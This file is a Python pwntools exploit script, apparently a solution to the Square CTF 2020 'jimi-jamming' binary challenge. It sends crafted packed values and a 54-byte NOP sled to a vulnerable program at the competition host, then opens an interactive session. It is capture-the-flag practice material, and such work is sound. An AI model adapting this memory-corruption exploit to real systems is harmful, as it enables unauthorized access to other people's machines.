#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./jimi-jamming')
context.terminal = ['alacritty', '-e', 'sh', '-c']

host = args.HOST or 'challenges.2020.squarectf.com'
port = int(args.PORT or 9001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *vuln+128
continue
'''.format(**locals())

# -- Exploit goes here --
io = start()
io.recvline()
io.send(p64(0xff))
io.recvline()
io.send(p64(0xdeadbeef))
io.recv()
#54 is the exact spot
io.send("\x90"*54)
io.interactive()

